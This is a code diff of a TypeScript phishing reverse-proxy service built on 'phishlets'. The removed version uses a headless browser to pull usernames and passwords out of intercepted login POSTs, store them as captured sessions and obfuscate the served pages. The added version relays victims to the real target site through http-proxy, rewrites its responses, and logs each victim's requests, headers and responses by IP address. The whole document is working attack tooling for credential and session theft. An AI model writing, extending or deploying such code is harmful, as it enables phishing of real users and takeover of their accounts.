@@ -1,57 +1,51 @@
-import puppeteer, { Browser } from 'puppeteer';
-import JavaScriptObfuscator from 'javascript-obfuscator';
+import http from 'http';
+import httpProxy from 'http-proxy';
 import { Phishlet } from '../entities';
 import { AppDataSource } from '../data-source';
-import { CapturedSession } from '../entities';
+import { CapturedSession, ProxyLog } from '../entities';
 
 class ProxyService {
-    private browser: Browser | null = null;
+    private proxy: httpProxy;
 
-    async initialize() {
-        this.browser = await puppeteer.launch();
+    constructor() {
+        this.proxy = httpProxy.createProxyServer({});
     }
 
-    async handleRequest(phishlet: Phishlet): Promise<string> {
-        if (!this.browser) {
-            await this.initialize();
-        }
+    async handleRequest(req: http.IncomingMessage, res: http.ServerResponse, phishlet: Phishlet): Promise<void> {
+        const session = await this.findOrCreateSession(req, phishlet);
 
-        const page = await this.browser!.newPage();
-
-        await page.setRequestInterception(true);
-        page.on('request', (request) => {
-            // Intercept and log requests
-            if (request.method() === 'POST') {
-                this.captureCredentials(request, phishlet);
-            }
-            request.continue();
+        this.proxy.web(req, res, {
+            target: phishlet.targetUrl,
+            changeOrigin: true,
+            selfHandleResponse: true,
         });
 
-        await page.goto(phishlet.targetUrl, { waitUntil: 'networkidle2' });
-        const content = await page.content();
-        await page.close();
-
-        const rewrittenContent = this.rewriteContent(content, phishlet);
-        return this.obfuscateContent(rewrittenContent);
+        this.proxy.on('proxyRes', async (proxyRes, req, res) => {
+            let body = '';
+            proxyRes.on('data', (chunk) => {
+                body += chunk;
+            });
+            proxyRes.on('end', async () => {
+                const rewrittenBody = this.rewriteContent(body, phishlet);
+                await this.logRequest(session, req, proxyRes, rewrittenBody);
+                res.end(rewrittenBody);
+            });
+        });
     }
 
-    private async captureCredentials(request: puppeteer.HTTPRequest, phishlet: Phishlet) {
+    private async findOrCreateSession(req: http.IncomingMessage, phishlet: Phishlet): Promise<CapturedSession> {
         const sessionRepo = AppDataSource.getRepository(CapturedSession);
-        const postData = request.postData();
-        if (postData) {
-            const params = new URLSearchParams(postData);
-            const username = params.get(phishlet.credSelectors.username);
-            const password = params.get(phishlet.credSelectors.password);
-
-            if (username && password) {
-                // Simplified session management
-                const session = new CapturedSession();
-                session.phishletId = phishlet.id;
-                session.ipAddress = 'unknown'; // This should be captured from the initial request
-                session.capturedData = { username, password };
-                await sessionRepo.save(session);
-            }
+        // This is a simplified session management. A real implementation would use cookies.
+        const ipAddress = req.socket.remoteAddress || 'unknown';
+        let session = await sessionRepo.findOne({ where: { ipAddress, phishletId: phishlet.id } });
+        if (!session) {
+            session = new CapturedSession();
+            session.phishletId = phishlet.id;
+            session.ipAddress = ipAddress;
+            session.capturedData = {};
+            await sessionRepo.save(session);
         }
+        return session;
     }
 
     private rewriteContent(body: string, phishlet: Phishlet): string {
@@ -64,12 +58,17 @@ class ProxyService {
         return rewrittenBody;
     }
 
-    private obfuscateContent(body: string): string {
-        const obfuscationResult = JavaScriptObfuscator.obfuscate(body, {
-            compact: true,
-            controlFlowFlattening: true,
-        });
-        return obfuscationResult.getObfuscatedCode();
+    private async logRequest(session: CapturedSession, req: http.IncomingMessage, proxyRes: http.IncomingMessage, responseBody: string): Promise<void> {
+        const logRepo = AppDataSource.getRepository(ProxyLog);
+        const log = new ProxyLog();
+        log.sessionId = session.id;
+        log.method = req.method || 'unknown';
+        log.url = req.url || 'unknown';
+        log.requestHeaders = req.headers;
+        log.responseStatusCode = proxyRes.statusCode || 0;
+        log.responseHeaders = proxyRes.headers;
+        log.responseBody = responseBody;
+        await logRepo.save(log);
     }
 }
 
